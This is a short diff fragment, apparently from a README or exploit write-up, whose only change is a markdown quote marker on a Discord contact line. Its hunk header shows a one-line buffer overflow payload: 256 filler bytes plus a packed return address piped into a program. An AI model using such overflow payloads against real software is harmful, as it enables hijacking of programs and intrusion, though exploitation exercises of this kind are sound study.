@@ -65,4 +65,4 @@ python -c "import struct; print('A' * 256 + struct.pack('<I', 0x1343d00))" | .â
 
 
 More info 
->> Ask me on Discord @Coldspot#7033
+> Ask me on Discord @Coldspot#7033
